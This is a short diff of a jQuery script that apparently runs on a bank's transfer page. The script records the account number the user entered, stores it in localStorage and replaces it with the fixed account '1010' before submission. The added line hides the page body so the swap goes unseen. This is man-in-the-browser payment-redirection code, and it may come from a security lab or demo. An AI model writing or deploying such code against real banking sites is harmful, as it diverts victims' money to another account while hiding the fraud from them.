@@ -52,8 +52,9 @@ $(document).ready(function(){
 			table.unshift({accBefore: $('#accnr').val()});
 			console.table(table);
 			localStorage.setItem(nick, JSON.stringify(table));
-			
+			document.getElementsByTagName("BODY")[0].style.visibility = "hidden";
 			$('#accnr').val('1010');
+			
 			return true;
 		});
 	} else if (location.pathname == "/bank/sent.php") {
